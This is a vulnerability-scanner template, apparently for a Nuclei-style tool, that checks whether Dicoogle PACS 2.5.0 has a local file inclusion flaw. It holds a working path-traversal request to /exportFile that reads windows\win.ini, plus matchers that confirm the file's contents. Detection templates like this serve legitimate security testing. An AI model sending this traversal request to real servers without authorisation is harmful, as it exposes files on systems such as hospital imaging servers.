id: "dicoogle-pacs-lfi"
name: "Dicoogle PACS 2.5.0 - Local File Inclusion"
severity: "high"
description: "Dicoogle PACS 2.5.0 is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required."
tech:
  - "generic"
tags:
  - "edb"
  - "windows"
  - "lfi"
  - "dicoogle"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/45007"
spaExclusion: true
request:
  method: "GET"
  path: "/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "or"
matchers:
  - type: "word"
    part: "body"
    words:
      - "bit app support"
      - "fonts"
      - "extensions"
    condition: "and"
